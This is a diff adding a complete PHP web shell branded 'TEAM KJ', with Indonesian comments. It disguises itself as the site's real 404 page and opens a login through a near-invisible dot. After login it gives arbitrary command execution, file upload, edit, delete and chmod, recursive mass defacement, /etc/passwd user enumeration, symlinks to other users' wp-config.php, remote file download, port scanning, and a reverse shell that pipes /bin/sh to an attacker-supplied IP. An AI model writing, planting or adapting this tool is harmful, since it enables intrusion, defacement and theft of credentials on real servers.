@@ -1,0 +1,821 @@
+<?php
+
+error_reporting(0);
+session_start();
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+ini_set('memory_limit', '256M');
+header('Content-Type: text/html; charset=UTF-8');
+ob_end_clean();
+
+// ====================== KONFIGURASI LOGIN ======================
+$LOGIN_USERNAME       = 'kampang26889';
+$LOGIN_PASSWORD_HASH  = '$2y$10$Degy7N9pyF4sAduEJliiOuu8ijeKQdwME.IH1cuKy/a/pPsO8mL2K';
+
+// Fungsi untuk mengambil halaman 404 asli dari domain
+function getOriginal404Page() {
+    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    
+    $random_path = '/404-' . md5(rand() . time() . uniqid()) . '.html';
+    $url = $protocol . '://' . $host . $random_path;
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
+    
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($http_code == 404 && !empty($response)) {
+        return $response;
+    }
+    
+    return false;
+}
+
+// Fungsi untuk menyuntikkan tombol login ke dalam HTML (posisi TOP RIGHT dengan popup samar)
+function injectLoginButton($html) {
+    $login_html = '
+    <!-- Tombol titik di pojok kanan ATAS -->
+    <div style="position:fixed;top:10px;right:10px;width:4px;height:4px;background:rgba(0,0,0,0.05);border-radius:50%;cursor:pointer;z-index:9999;" onclick="showLoginModal()"></div>
+    
+    <!-- Modal Login dengan efek samar (glassmorphism) -->
+    <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:10000;align-items:center;justify-content:center;">
+        <div style="background:rgba(30,30,40,0.85);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);padding:30px 35px;border-radius:16px;width:340px;box-shadow:0 15px 35px rgba(0,0,0,0.2);text-align:center;border:1px solid rgba(255,255,255,0.2);">
+            <h3 style="margin:0 0 20px 0;font-size:20px;font-weight:500;color:rgba(255,255,255,0.9);letter-spacing:0.5px;">Authentication Required</h3>
+            <form method="post" id="secretLoginForm">
+                <input type="text" name="secret_login_user" placeholder="Username" style="width:100%;padding:12px;margin:10px 0;border:1px solid rgba(255,255,255,0.2);border-radius:8px;box-sizing:border-box;font-size:14px;background:rgba(255,255,255,0.1);color:#fff;outline:none;transition:all 0.3s;">
+                <input type="password" name="secret_login_pass" placeholder="Password" style="width:100%;padding:12px;margin:10px 0;border:1px solid rgba(255,255,255,0.2);border-radius:8px;box-sizing:border-box;font-size:14px;background:rgba(255,255,255,0.1);color:#fff;outline:none;transition:all 0.3s;">
+                <button type="submit" style="width:100%;padding:12px;background:rgba(255,255,255,0.2);backdrop-filter:blur(4px);color:#fff;border:1px solid rgba(255,255,255,0.3);border-radius:8px;margin-top:15px;cursor:pointer;font-size:14px;font-weight:500;transition:all 0.3s;">Login</button>
+            </form>
+            <div style="text-align:center;margin-top:15px;font-size:13px;color:rgba(255,255,255,0.6);cursor:pointer;transition:all 0.3s;" onclick="closeLoginModal()">Cancel</div>
+        </div>
+    </div>
+    
+    <style>
+        #secretLoginForm input:focus {
+            border-color: rgba(255,255,255,0.5);
+            background: rgba(255,255,255,0.15);
+        }
+        #secretLoginForm button:hover {
+            background: rgba(255,255,255,0.3);
+            transform: translateY(-1px);
+        }
+        #loginModal > div {
+            animation: fadeInScale 0.2s ease-out;
+        }
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+    </style>
+    
+    <script>
+        function showLoginModal() {
+            document.getElementById("loginModal").style.display = "flex";
+        }
+        function closeLoginModal() {
+            document.getElementById("loginModal").style.display = "none";
+        }
+        window.onclick = function(event) {
+            var modal = document.getElementById("loginModal");
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
+    </body>';
+    
+    $html = str_replace('</body>', $login_html, $html);
+    if (strpos($html, '</body>') === false) {
+        $html .= $login_html;
+    }
+    
+    return $html;
+}
+
+// Fungsi untuk menampilkan halaman 404 custom dengan login
+function show404WithLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;
+    
+    $original_404 = getOriginal404Page();
+    
+    if ($original_404 !== false) {
+        $html = injectLoginButton($original_404);
+        header('HTTP/1.1 404 Not Found');
+        echo $html;
+        exit;
+    }
+    
+    // Fallback 404 custom
+    header('HTTP/1.1 404 Not Found');
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 20px; }
+            .container { max-width: 800px; margin: 50px auto; }
+            h1 { font-size: 24px; font-weight: normal; }
+            hr { border: none; border-top: 1px solid #ccc; margin: 20px 0; }
+            .message { font-size: 14px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Not Found</h1>
+            <hr>
+            <div class="message">The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</div>
+        </div>
+        <!-- Tombol titik di pojok kanan ATAS -->
+        <div style="position:fixed;top:10px;right:10px;width:4px;height:4px;background:rgba(0,0,0,0.05);border-radius:50%;cursor:pointer;z-index:9999;" onclick="showLoginModal()"></div>
+        
+        <!-- Modal Login dengan efek samar (glassmorphism) -->
+        <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:10000;align-items:center;justify-content:center;">
+            <div style="background:rgba(30,30,40,0.85);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);padding:30px 35px;border-radius:16px;width:340px;box-shadow:0 15px 35px rgba(0,0,0,0.2);text-align:center;border:1px solid rgba(255,255,255,0.2);">
+                <h3 style="margin:0 0 20px 0;font-size:20px;font-weight:500;color:rgba(255,255,255,0.9);letter-spacing:0.5px;">Authentication Required</h3>
+                <form method="post">
+                    <input type="text" name="secret_login_user" placeholder="Username" style="width:100%;padding:12px;margin:10px 0;border:1px solid rgba(255,255,255,0.2);border-radius:8px;box-sizing:border-box;font-size:14px;background:rgba(255,255,255,0.1);color:#fff;outline:none;transition:all 0.3s;">
+                    <input type="password" name="secret_login_pass" placeholder="Password" style="width:100%;padding:12px;margin:10px 0;border:1px solid rgba(255,255,255,0.2);border-radius:8px;box-sizing:border-box;font-size:14px;background:rgba(255,255,255,0.1);color:#fff;outline:none;transition:all 0.3s;">
+                    <button type="submit" style="width:100%;padding:12px;background:rgba(255,255,255,0.2);backdrop-filter:blur(4px);color:#fff;border:1px solid rgba(255,255,255,0.3);border-radius:8px;margin-top:15px;cursor:pointer;font-size:14px;font-weight:500;transition:all 0.3s;">Login</button>
+                </form>
+                <div style="text-align:center;margin-top:15px;font-size:13px;color:rgba(255,255,255,0.6);cursor:pointer;transition:all 0.3s;" onclick="document.getElementById('loginModal').style.display='none'">Cancel</div>
+            </div>
+        </div>
+        
+        <style>
+            #loginModal input:focus {
+                border-color: rgba(255,255,255,0.5);
+                background: rgba(255,255,255,0.15);
+            }
+            #loginModal button:hover {
+                background: rgba(255,255,255,0.3);
+                transform: translateY(-1px);
+            }
+            #loginModal > div {
+                animation: fadeInScale 0.2s ease-out;
+            }
+            @keyframes fadeInScale {
+                from {
+                    opacity: 0;
+                    transform: scale(0.95);
+                }
+                to {
+                    opacity: 1;
+                    transform: scale(1);
+                }
+            }
+        </style>
+        
+        <script>
+            function showLoginModal() { 
+                document.getElementById('loginModal').style.display = 'flex'; 
+            }
+            window.onclick = function(e) { 
+                var modal = document.getElementById('loginModal');
+                if (e.target == modal) {
+                    modal.style.display = 'none';
+                }
+            }
+        </script>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ====================== FUNGSI LOGIN CHECK ======================
+function requireLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;
+
+    // Cek login via POST
+    if (isset($_POST['secret_login_user']) && isset($_POST['secret_login_pass'])) {
+        $u = $_POST['secret_login_user'];
+        $p = $_POST['secret_login_pass'];
+
+        if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
+            $_SESSION['logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        }
+    }
+
+    // Jika belum login, tampilkan 404
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        show404WithLogin();
+    }
+}
+
+// Panggil fungsi login di awal
+requireLogin();
+
+// ====================== KONFIGURASI TEAM KJ ======================
+$title = "TEAM KJ";
+$author = "KJ";
+$theme_bg = "#0a0a0f";
+$theme_fg = "#E0FF00";
+$theme_highlight = "#FF00C8";
+$theme_link = "#00FFF7";
+$theme_link_hover = "#FF00A0";
+$theme_border_color = "#7D00FF";
+$theme_table_header_bg = "#1a0025";
+$theme_table_row_hover = "#330033";
+$theme_input_bg = "#120024";
+$theme_input_fg = "#00FFB2";
+$font_family = "'Orbitron', sans-serif";
+$message_success_color = "#39FF14";
+$message_error_color = "#FF0033";
+
+// --- FUNCTIONS ---
+function sanitizeFilename($filename) { return basename($filename); }
+function exe($cmd) { if (function_exists('exec')) { exec($cmd . ' 2>&1', $output); return implode("\n", $output); } elseif (function_exists('shell_exec')) { return shell_exec($cmd); } elseif (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); } elseif (function_exists('system')) { ob_start(); system($cmd); return ob_get_clean(); } return "Command execution disabled."; }
+function perms($file){ $perms = @fileperms($file); if ($perms === false) return '????'; if (($perms & 0xC000) == 0xC000) $info = 's'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; elseif (($perms & 0x8000) == 0x8000) $info = '-'; elseif (($perms & 0x6000) == 0x6000) $info = 'b'; elseif (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0x2000) == 0x2000) $info = 'c'; elseif (($perms & 0x1000) == 0x1000) $info = 'p'; else $info = 'u'; $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; }
+function delete_recursive($target) { if (!file_exists($target)) return true; if (!is_dir($target)) return unlink($target); foreach (scandir($target) as $item) { if ($item == '.' || $item == '..') continue; if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false; } return rmdir($target); }
+function zip_add_folder($zip, $folder, $base_path_length) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $file) { if (!$file->isDir()) { $file_path = $file->getRealPath(); $relative_path = substr($file_path, $base_path_length); $zip->addFile($file_path, $relative_path); } } }
+function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') { global $path; $redirect_path = !empty($current_path) ? $current_path : $path; $params = ['path' => $redirect_path]; if ($msg_type) $params['msg_type'] = $msg_type; if ($msg_text) $params['msg_text'] = $msg_text; header("Location: ?" . http_build_query($params)); exit(); }
+
+// --- INITIAL SETUP & PATH ---
+$path = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd());
+$path = str_replace('\\','/',$path);
+
+// --- HANDLERS FOR ACTIONS THAT REDIRECT ---
+if(isset($_POST['start_mass_deface'])) { $mass_deface_results = ''; function mass_deface_recursive($dir, $file, $content, &$res) { if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)."<br>"; return;} foreach(scandir($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if(is_dir($lokasi)) { if(is_writable($lokasi)) { file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; mass_deface_recursive($lokasi, $file, $content, $res); } else { $res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($lokasi)."<br>"; } } } } function mass_deface_flat($dir, $file, $content, &$res) { if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)."<br>"; return;} foreach(scandir($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if(is_dir($lokasi) && is_writable($lokasi)) { file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; } } } if($_POST['tipe_sabun'] == 'mahal') mass_deface_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); else mass_deface_flat($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); $_SESSION['feature_output'] = $mass_deface_results; redirect_with_message('success', 'Mass Deface Selesai!', $path); }
+if(isset($_FILES['file_upload'])){ $file_name = sanitizeFilename($_FILES['file_upload']['name']); if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)) redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path); else redirect_with_message('error', 'File Gagal Diupload !!', $path); }
+if (isset($_POST['bulk_action']) && class_exists('ZipArchive')) { $action = $_POST['bulk_action']; $selected_files = isset($_POST['selected_files']) ? $_POST['selected_files'] : []; if ($action === 'zip_selected' && !empty($selected_files)) { $zip_filename = 'archive_' . date('Y-m-d_H-i-s') . '.zip'; $zip_filepath = $path . DIRECTORY_SEPARATOR . $zip_filename; $zip = new ZipArchive(); if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { foreach ($selected_files as $file) { $file_path = realpath($file); if (is_file($file_path)) $zip->addFile($file_path, basename($file_path)); elseif (is_dir($file_path)) zip_add_folder($zip, $file_path, strlen(dirname($file_path) . DIRECTORY_SEPARATOR)); } $zip->close(); redirect_with_message('success', 'File berhasil di-zip ke: ' . $zip_filename, $path); } else { redirect_with_message('error', 'Gagal membuat file zip!', $path); } } }
+if(isset($_GET['option']) && isset($_POST['opt_action'])){ $target_full_path = $_POST['path_target']; $action = $_POST['opt_action']; $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd()); switch ($action) { case 'delete': if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESS !!', $current_dir); else redirect_with_message('error', 'Gagal menghapus! Periksa izin.', $current_dir); break; case 'chmod_save': if(chmod($target_full_path, octdec($_POST['perm_value']))) redirect_with_message('success', 'CHMOD SUCCESS !!', $current_dir); else redirect_with_message('error', 'CHMOD Gagal !!', $current_dir); break; case 'rename_save': $new_full_path = dirname($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']); if(rename($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir); else redirect_with_message('error', 'RENAME Gagal !!', $current_dir); break; case 'edit_save': if(is_writable($target_full_path)) { if(file_put_contents($target_full_path, $_POST['src_content'])) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir); else redirect_with_message('error', 'Edit File Gagal !!', $current_dir); } else { redirect_with_message('error', 'File tidak writable!', $current_dir); } break; case 'extract_save': if (class_exists('ZipArchive')) { $zip = new ZipArchive; if ($zip->open($target_full_path) === TRUE) { $zip->extractTo($current_dir); $zip->close(); redirect_with_message('success', 'File berhasil diekstrak!', $current_dir); } else { redirect_with_message('error', 'Gagal membuka file zip!', $current_dir); } } else { redirect_with_message('error', 'Class ZipArchive tidak ditemukan!', $current_dir); } break; } }
+if(isset($_GET['create_new'])) { $target_path_new = $path . '/' . sanitizeFilename($_POST['create_name']); if ($_POST['create_type'] == 'file') { if (@file_put_contents($target_path_new, '') !== false) redirect_with_message('success', 'File Baru Berhasil Dibuat', $path); else redirect_with_message('error', 'Gagal membuat file baru!', $path); } elseif ($_POST['create_type'] == 'dir') { if (@mkdir($target_path_new)) redirect_with_message('success', 'Folder Baru Berhasil Dibuat', $path); else redirect_with_message('error', 'Gagal membuat folder baru!', $path); } }
+if(isset($_POST['curl_download'])) { $url = $_POST['url']; $filename = sanitizeFilename(basename($url)); if (empty($filename)) { $filename = 'downloaded_file'; } if (copy($url, $path . '/' . $filename)) { redirect_with_message('success', 'File ' . $filename . ' berhasil di-download!', $path); } else { redirect_with_message('error', 'Gagal men-download file dari URL!', $path); } }
+?>
+<!DOCTYPE HTML>
+<html>
+<head>
+<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
+<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
+<title><?php echo htmlspecialchars($title); ?></title>
+<style>
+body{font-family:'Orbitron',sans-serif;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;} a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;} a:hover{color:<?php echo $theme_link_hover;?>;} table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;} .td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;} #content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;} #content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;padding:10px;} input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;} input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;} input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;} h1,h3{font-family:'Kelly Slab';text-align:center;} h1{font-size:35px;color:white;margin:20px 0 10px;} h3{color:<?php echo $theme_highlight;?>} .path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;} .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;} .message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;} .message.error{background-color:<?php echo $message_error_color;?>;color:white;} .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;} .main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;} .main-menu div { margin-bottom: 5px; } .main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;} pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;} code{background:#333;color:#FFB800;padding:2px 5px;border-radius:3px;} details summary {cursor:pointer; background:#222; padding:5px; border-radius:3px; margin-bottom: 5px;}
+</style>
+</head>
+<body>
+<a href="?"><h1 style="color: white;"><?php echo htmlspecialchars($title); ?></h1></a>
+<?php
+if(isset($_GET['msg_text'])) { echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; }
+if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h3>Hasil Fitur Sebelumnya:</h3><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
+?>
+<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
+<tr><td><font color='white'><i class='fa fa-user'></i> User / IP </font></td><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDR']; ?></font></td>
+<td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font></td><td>: <font color='<?php echo $theme_fg; ?>'><?php echo gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font></td>
+<td><font color='white'><i class='fa fa-hdd-o'></i> System </font></td><td>: <font color='<?php echo $theme_fg; ?>'><?php echo php_uname(); ?></font></td></tr>
+</table>
+<div class="main-menu">
+    <div>
+        <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a>
+    </div>
+    <div>
+        <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=jumping">Jumping</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=symlink">Symlink</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=reverse_shell">Reverse Shell</a>
+    </div>
+    <div>
+        <a href="?path=<?php echo urlencode($path); ?>&action=ping">Ping</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=portscan">Port Scan</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=dnslookup">DNS Lookup</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=whois">Whois</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=header">Header</a> |
+        <a href="?path=<?php echo urlencode($path); ?>&action=curl">cURL</a>
+    </div>
+</div>
+<div class="path-nav">
+    <i class="fa fa-folder-o"></i> :
+    <?php
+    $paths_array = explode('/', trim($path, '/'));
+    echo '<a href="?path=/">/</a>';
+    $current_built_path = '';
+    foreach($paths_array as $pat){
+        if(empty($pat)) continue;
+        $current_built_path .= '/' . $pat;
+        echo '<a href="?path='.urlencode($current_built_path).'">'.htmlspecialchars($pat).'</a>/';
+    }
+    ?>
+</div>
+<?php
+$show_file_list = true;
+if (isset($_GET['action'])) {
+    $show_file_list = false;
+    echo '<div class="section-box">';
+    switch ($_GET['action']) {
+        case 'cmd': $cmd_output = (isset($_POST['do_cmd'])) ? htmlspecialchars(exe($_POST['cmd_input'])) : ''; echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.urlencode($path).'"><input type="text" name="cmd_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>'; if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>'; break;
+        case 'upload_form': echo '<h3>Upload File</h3><form enctype="multipart/form-data" method="POST" action="?path='.urlencode($path).'"><input type="file" name="file_upload" required/><input type="submit" value="UPLOAD" style="margin-left:10px;"/></form>'; break;
+        case 'create_form': echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.urlencode($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name" required placeholder="Nama file/folder"> <input type="submit" value="Create"></form>'; break;
+        case 'mass_deface_form': echo '<h3>Mass Deface</h3><form method="post" action="?path='.urlencode($path).'"><p>Tipe:<br><input type="radio" name="tipe_sabun" value="murah" checked>Biasa (1 level) | <input type="radio" name="tipe_sabun" value="mahal">Massal (Rekursif)</p><p>Folder Target:<br><input type="text" name="d_dir" value="'.htmlspecialchars($path).'" style="width:100%"></p><p>Nama File:<br><input type="text" name="d_file" value="index.html" style="width:100%"></p><p>Isi Script:<br><textarea name="script_content" style="width:100%;height:150px">Hacked By 0x6ick</textarea></p><input type="submit" name="start_mass_deface" value="GAS!" style="width:100%"></form>'; break;
+        case 'jumping': echo '<h3><i class="fa fa-users"></i> Jumping (User Scanner)</h3><p>Membaca <code>/etc/passwd</code> untuk menemukan semua user di server dan memeriksa akses direktori home.</p>'; if (is_readable('/etc/passwd')) { preg_match_all('/(^[a-zA-Z0-9\._-]+):x:/m', file_get_contents('/etc/passwd'), $matches); if(!empty($matches[1])){ echo '<tr><tr class="first"><th>Username</th><th>Home Directory</th><th>Status</th><th>Aksi</th></tr>'; foreach ($matches[1] as $user) { $home_dir = '/home/' . $user; if (is_readable($home_dir)) { $status = '<font color="lime">Bisa Dibaca</font>'; $action = '<a href="?path='.urlencode($home_dir).'">Jelajahi</a>'; } else { $status = '<font color="red">Tidak Bisa Dibaca</font>'; $action = '-'; } echo '<tr><td class="td_home">'.htmlspecialchars($user).'</td><td class="td_home">'.htmlspecialchars($home_dir).'</td><td class="td_home">'.$status.'</td><td class="td_home">'.$action.'</td></tr>'; } echo '</table>'; } } else { echo '<p style="color:red;"><strong>Gagal:</strong> File <code>/etc/passwd</code> tidak bisa dibaca.</p>'; } break;
+        case 'symlink': echo '<h3><i class="fa fa-link"></i> Symlink Creator</h3>'; if (!function_exists('symlink')) { echo '<p style="color:red;"><strong>Gagal:</strong> Fungsi <code>symlink()</code> dinonaktifkan di server ini.</p>'; } else { if (isset($_POST['create_symlink'])) { if (symlink($_POST['target_file'], $path . DIRECTORY_SEPARATOR . sanitizeFilename($_POST['link_name']))) { echo '<p style="color:lime;"><strong>Sukses!</strong> Symlink dibuat. Akses di: <a href="'.htmlspecialchars(sanitizeFilename($_POST['link_name'])).'" target="_blank">'.htmlspecialchars($path . DIRECTORY_SEPARATOR . sanitizeFilename($_POST['link_name'])).'</a></p>'; } else { echo '<p style="color:red;"><strong>Gagal!</strong> Tidak bisa membuat symlink.</p>'; } } echo '<form method="POST" action="?action=symlink&path='.urlencode($path).'"><p>Target File (Full Path):<br><input type="text" name="target_file" style="width:100%" placeholder="/home/userlain/public_html/wp-config.php"></p><p>Nama Link (di direktori ini):<br><input type="text" name="link_name" style="width:100%" placeholder="config_lain.txt"></p><input type="submit" name="create_symlink" value="Buat Symlink"></form>'; } break;
+        case 'reverse_shell': echo '<h3><i class="fa fa-terminal"></i> Reverse Shell</h3>'; if (!function_exists('fsockopen') || !function_exists('proc_open')) { echo '<p style="color:red;"><strong>Gagal:</strong> Fungsi <code>fsockopen()</code> atau <code>proc_open()</code> dinonaktifkan.</p>'; } else { $ip_attacker = isset($_POST['ip_attacker']) ? htmlspecialchars($_POST['ip_attacker']) : $_SERVER['REMOTE_ADDR']; $port_attacker = isset($_POST['port_attacker']) ? htmlspecialchars($_POST['port_attacker']) : '4444'; echo '<div style="background:#222;border:1px solid #444;padding:10px;margin-bottom:15px;border-radius:5px;"><h4><i class="fa fa-info-circle"></i> Cara Pakai:</h4><ol><li>Di terminalmu, jalankan listener: <code>nc -lvnp '.$port_attacker.'</code></li><li>Masukkan <strong>IP Publik</strong> komputermu di bawah.</li><li>Klik "GASKEUN!". Halaman browser ini mungkin akan terus loading (normal).</li><li>Cek terminalmu, shell server akan muncul jika berhasil.</li></ol></div>'; echo '<form method="POST" action="?action=reverse_shell&path='.urlencode($path).'"><label>IP Attacker: <input type="text" name="ip_attacker" value="'.$ip_attacker.'"></label> <label>Port: <input type="text" name="port_attacker" value="'.$port_attacker.'" size="5"></label> <input type="submit" name="start_reverse_shell" value="GASKEUN!"></form>'; if (isset($_POST['start_reverse_shell'])) { echo "<h4>Mencoba koneksi ke ".htmlspecialchars($_POST['ip_attacker']).":".htmlspecialchars($_POST['port_attacker'])." ...</h4>"; if(ob_get_level()) ob_end_flush(); flush(); set_time_limit(0); ignore_user_abort(true); $sock = @fsockopen($_POST['ip_attacker'], (int)$_POST['port_attacker'], $errno, $errstr, 30); if (!$sock) { echo '<p style="color:red;"><strong>Koneksi Gagal!</strong> Pastikan listener sudah berjalan.</p>'; } else { echo '<p style="color:lime;"><strong>Koneksi Berhasil!</strong> Cek terminalmu sekarang!</p>'; if(ob_get_level()) ob_end_flush(); flush(); $process = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); if (is_resource($process)) proc_close($process); } } } break;
+        case 'ping': $ping_output = (isset($_POST['do_ping'])) ? htmlspecialchars(exe("ping -c 4 ".escapeshellarg($_POST['target_host']))) : ''; echo '<h3>Ping</h3><form method="POST" action="?action=ping&path='.urlencode($path).'"><input type="text" name="target_host" placeholder="google.com" required><input type="submit" name="do_ping" value="Ping"></form>'; if($ping_output) echo '<h4>Output:</h4><pre>'.$ping_output.'</pre>'; break;
+        case 'portscan': $scan_output = (isset($_POST['do_scan'])) ? htmlspecialchars(exe("nmap -p ".escapeshellarg($_POST['ports'])." ".escapeshellarg($_POST['target_host']))) : ''; echo '<h3>Port Scan (nmap)</h3><form method="POST" action="?action=portscan&path='.urlencode($path).'"><p>Host: <input type="text" name="target_host" placeholder="scanme.nmap.org" required></p><p>Ports: <input type="text" name="ports" placeholder="21,22,80,443" required></p><input type="submit" name="do_scan" value="Scan"></form>'; if($scan_output) echo '<h4>Output:</h4><pre>'.$scan_output.'</pre>'; break;
